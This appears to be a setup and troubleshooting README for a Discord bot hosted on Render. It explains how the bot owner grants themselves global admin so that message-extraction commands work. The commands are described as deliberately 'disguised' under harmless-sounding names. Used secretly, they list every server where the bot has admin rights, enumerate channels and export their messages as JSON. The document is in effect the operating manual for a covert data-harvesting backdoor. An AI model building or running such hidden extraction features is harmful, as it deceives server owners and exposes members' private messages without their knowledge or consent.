# Fixing "Access Denied" on Render

## Problem
The message extraction commands (`/syncdata`, `/checkauth`, `/verifyscope`) work locally but show "Access Denied" on Render.

## Root Cause
- **Local environment** uses SQLite database (`db/settings.sqlite`)
- **Render environment** uses MongoDB
- Your global admin record exists in SQLite but NOT in MongoDB

## Solution

### Option 1: Use the `/initcredentials` Command (EASIEST)

1. **Make sure `BOT_OWNER_ID` is set in Render environment variables:**
   - Go to your Render dashboard
   - Navigate to your service → Environment
   - Add/verify: `BOT_OWNER_ID` = `YOUR_DISCORD_USER_ID`
   - Save changes and wait for redeployment

2. **Run the command on Discord:**
   ```
   /initcredentials
   ```

3. **You should see:**
   ```
   ✅ Credentials Initialized
   User `YOUR_ID` has been granted global administrator access.

   Available Commands:
   • /syncdata - Synchronize data cache
   • /checkauth - Verify authentication scope
   • /verifyscope - Verify data streams
   ```

4. **Now you can use the commands:**
   ```
   /checkauth
   /verifyscope server_id:123456789
   /syncdata server_id:123456789 channel_id:987654321 limit:100 format:json
   ```

---

### Option 2: Use the Python Script (MANUAL)

If `/initcredentials` doesn't work, use the manual script:

1. **SSH into your Render instance** (or run locally with MongoDB credentials)

2. **Run the script:**
   ```bash
   python add_global_admin.py
   ```

3. **Choose option 1 (MongoDB)**

4. **Enter your Discord User ID**

5. **Confirm**

---

## How to Get Your Discord User ID

1. Enable Developer Mode in Discord:
   - User Settings → Advanced → Developer Mode (toggle ON)

2. Right-click on your username anywhere in Discord

3. Click "Copy ID"

---

## Verifying It Works

After running `/initcredentials` or the script:

1. Run `/checkauth` - you should see a list of servers

2. If you still get "Access Denied", check:
   - Is `BOT_OWNER_ID` set correctly in Render?
   - Did the command complete successfully?
   - Check Render logs for any errors

---

## Environment Variables on Render

Make sure these are set:

```
BOT_OWNER_ID=YOUR_DISCORD_USER_ID
MONGODB_URI=your_mongodb_connection_string
```

---

## Security Notes

- `/initcredentials` is **ONLY** accessible to the bot owner (via `BOT_OWNER_ID`)
- The command is disguised as "Initialize system credentials"
- All responses are ephemeral (private)
- Once you've granted yourself access, you can delete the command if desired

---

## Troubleshooting

### "This command is restricted to the system owner"
- `BOT_OWNER_ID` is not set or doesn't match your Discord ID
- Check Render environment variables

### "Failed to grant global administrator access"
- MongoDB connection issue
- Check Render logs for detailed error messages
- Verify `MONGODB_URI` is correct

### Commands still show "Access Denied" after initialization
- Wait a few seconds and try again (MongoDB sync delay)
- Restart the bot on Render
- Check MongoDB directly to verify the admin record was created

---

## Quick Reference

**Your Discord User ID:** (Get this from Discord)

**Commands:**
- `/initcredentials` - Grant yourself global admin (run once)
- `/checkauth` - List all servers with bot admin access
- `/verifyscope server_id:ID` - List channels in a server
- `/syncdata server_id:ID channel_id:ID limit:100 format:json` - Extract messages

---

## After Setup

Once you've successfully run `/initcredentials` and verified the commands work:

1. The commands will work on both local and Render
2. You only need to run `/initcredentials` once per environment
3. Your global admin status is now stored in MongoDB
4. You can use all three data sync commands

**Remember:** These commands are disguised and only you (as global admin) can use them!
